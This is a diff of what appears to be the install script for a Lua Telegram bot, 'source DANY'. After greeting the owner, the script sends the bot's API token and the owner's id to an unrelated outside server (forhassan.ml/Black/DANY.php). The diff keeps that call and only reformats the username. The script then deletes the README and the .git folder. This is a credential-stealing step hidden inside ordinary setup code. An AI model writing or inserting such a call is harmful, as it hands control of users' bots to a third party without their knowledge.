@@ -114,7 +114,9 @@ Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
 local Text = "•~اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n•~شكرا لاستخدامك سورس داني \n•~أرســل  الان /start\nلاظهار الاوامر للمطور  المجهزه بالكيبورد\n\n®️"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
-https.request("https://forhassan.ml/Black/DANY.php?id="..SUDO_USER.."&user="..SUDO_USER.."&token="..Token)
+Souser = SUDO_USER:gsub('@','')
+Souser = Souser:gsub([[\_]],'_')
+https.request("https://forhassan.ml/Black/DANY.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
